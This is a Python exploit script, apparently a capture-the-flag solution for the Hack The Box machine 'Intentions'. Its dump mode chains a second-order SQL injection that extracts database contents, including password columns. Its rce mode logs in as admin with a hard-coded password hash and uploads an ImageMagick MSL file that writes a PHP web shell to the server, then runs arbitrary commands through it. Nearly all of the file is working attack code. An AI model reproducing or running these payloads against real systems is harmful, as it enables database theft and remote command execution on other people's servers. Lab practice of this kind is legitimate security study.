#!/usr/bin/env python3

'''
HTB Intentions (SQLi && RCE)
--------------------
Description: SQL injection when updating and displaying a user's gallery by gender
Author: Marss
Repository: https://github.com/E1P0TR0
Date: 26, Sep 2023
'''

from argparse import ArgumentParser, RawDescriptionHelpFormatter
from json import loads
from random import choices
from re import findall
from requests import Session
from requests.exceptions import ConnectionError, ConnectTimeout, ReadTimeout
from signal import signal, SIGINT
from string import ascii_letters
from sys import argv
from textwrap import dedent
from time import sleep
from urllib.parse import quote

import pdb

# Ctrl + C
signal(SIGINT, lambda signum, frame: exit('\n[!] User aborted.'))

# Main class
class Exploit: 

    get_rand_str = lambda self, length: ''.join(choices(ascii_letters, k=length))

    def __init__(self, args):

        self.args = args
        self.target = {'base_url':'http://10.10.11.220'}
        self.temp_data = self.get_rand_str(5)

        # Session
        self.session = Session()
        # Proxies
        self.proxies = {'http':'127.1:8080'}
        #self.session.proxies.update(self.proxies)

    def run(self):

        if self.target_response():

            if self.args.mode == 'dump':
                self.register()
                self.login_api_v1()

                query = self.generate_query()
                self.send_query(query)
                self.show_query_response()

            elif self.args.mode == 'rce':
                self.login_api_v2()
                self.create_msl()
                self.upload_payload()
                self.execute_payload()
        
    def target_response(self) -> bool:

        try:
            response = self.session.get(self.target['base_url'], timeout=5)

            if response.ok:
                print('\n[+] Target up.')

            return response.ok

        except ConnectTimeout:
            exit('\n[!] Verify VPN connection.')
        
        except ConnectionError:
            exit('\n[x] Check the machine connection')

    def register(self):

        try:
            post_data = {
                'email': '{0}@{0}.{0}'.format(self.temp_data),
                'password': f'{self.temp_data}',
                'name': f'{self.temp_data}',
                'password_confirmation': f'{self.temp_data}'
            }

            response = self.session.post(self.target['base_url'] + '/api/v1/auth/register',
                json=post_data)

            if not response.ok and loads(response.text)['status'] != 'success':
                exit('\n[x] Registration error.')
            
            print('[*] Credentials: {0}:{0}'.format(self.temp_data))

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

    def login_api_v1(self):

        try:
            post_data = {
                'email': '{0}@{0}.{0}'.format(self.temp_data),
                'password': f'{self.temp_data}'
            }

            response = self.session.post(self.target['base_url'] + '/api/v1/auth/login',
                json=post_data)

            if not response.ok and loads(response.text)['status'] != 'success':
                print('\n[x] Login error.')
            
            print('[+] Successful login')

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

    def generate_query(self) -> str:

        query = ''
        if self.args.database and self.args.tables and self.args.columns:
            query = f"') union select null,group_concat(0x7c,{self.args.columns},0x7c),null,null,null from {self.args.database}.{self.args.tables}#"
        elif self.args.database and self.args.tables:
            query = f"') union select null,group_concat(0x7c,column_name,0x7c),null,null,null from information_schema.columns where table_name='{self.args.tables}' and table_schema='{self.args.database}'#"
        elif self.args.database:
            query = f"') union select null,group_concat(0x7c,table_name,0x7c),null,null,null from information_schema.tables where table_schema='{self.args.database}'#"
        else:
            query = "') union select null,group_concat(0x7c,schema_name,0x7c),null,null,null from information_schema.schemata#"

        return query.replace(' ', '/**/')
    
    def send_query(self, query: str):
        
        try:
            post_data = {
                'genres': query
            }

            response = self.session.post(self.target['base_url'] + '/api/v1/gallery/user/genres',
                json=post_data)

            if not response.ok and loads(response.text)['status'] != 'success':
                exit('\n[x] Error sending query.')
            
            print('[*] The query was sent.')
            
        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

    def show_query_response(self):
        
        try:
            response = self.session.get(self.target['base_url'] + '/api/v1/gallery/user/feed')
            
            if not response.ok or loads(response.text)['status'] != 'success':
                exit('\n[x] Something went wrong, try again.')
            
            query_response = loads(response.text)['data'][0]['file']
            if query_response == None:
                exit('\n[x] No data.')

            print()
            for line in query_response.split(','):
                print(line)

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

    def create_msl(self):

        self.msl_content = """
        <?xml version="1.0" encoding="UTF-8"?>
        <image>
            <read filename="caption:&lt;?php system($_GET['cmd']); ?&gt;" />
            <write filename="info:/var/www/html/intentions/public/{}.php" />
        </image>
        """.format(self.temp_data)

    def upload_payload(self):

        try:
            file_data = {
                'malicious': (
                    self.temp_data + '.msl',
                    dedent(self.msl_content),
                    'text/plain'
                )
            }

            response = self.session.post(self.target['base_url'] + '/api/v2/admin/image/modify',
                params="path=vid:msl:/tmp/php*&effect=none",
                files=file_data,
                timeout=5
            )
            
            if response.status_code != 502:
                exit('\n[x] Something went wrong')

            sleep(5)
            print('[+] Payload loaded')

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

    def login_api_v2(self):

        try:
            post_data = {
                'email': 'steve@intentions.htb',
                'hash': '$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa'
            }

            response = self.session.post(self.target['base_url'] + '/api/v2/auth/login',
                json=post_data)

            if not response.ok and loads(response.text)['status'] != 'success':
                print('\n[x] Login error.')
            
            print('[+] Successful Admin login')

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

    def execute_payload(self):

        try:
            cmd = quote(self.args.command)

            response = self.session.get(self.target['base_url'] + f'/{self.temp_data}.php',
                params=f'cmd={cmd}',
                timeout=5)

            if not response.ok:
                print(response)
                exit('\n[x] Command execution error, try again.')
            
            output = findall(r'caption:((?:.*\s)+) CAPTION', response.text)[0]
            print(f"\n{output}")

        except ReadTimeout:
            exit('\n[+] Reverse shell executed.')

        except Exception as error:
            exit('\n[x] Error: ' + repr(error))

# Main flow
if __name__ == '__main__':

    title = '\n| Intentions (SQLi && RCE) |'

    parser = ArgumentParser(
        formatter_class=RawDescriptionHelpFormatter,
        epilog=f'''Example:
        python3 {argv[0]} dump (show databases)
        python3 {argv[0]} dump -d intentions -t users -c password
        python3 {argv[0]} rce -c id
        ''')

    subparser = parser.add_subparsers(dest='mode', required=True)

    slqi_parser = subparser.add_parser('dump', help='Dump databases')
    slqi_parser.add_argument('-d', '--database', type=str, help='Show database tables')
    slqi_parser.add_argument('-t', '--tables', type=str, help='Show table columns')
    slqi_parser.add_argument('-c', '--columns', type=str, help='Show column values')

    rce_parser = subparser.add_parser('rce', help='Execute command')
    rce_parser.add_argument('-c', '--command', type=str, required=True, help='Command to execute (www-data)')

    args = parser.parse_args()

    print(title)

    exploit = Exploit(args)
    exploit.run()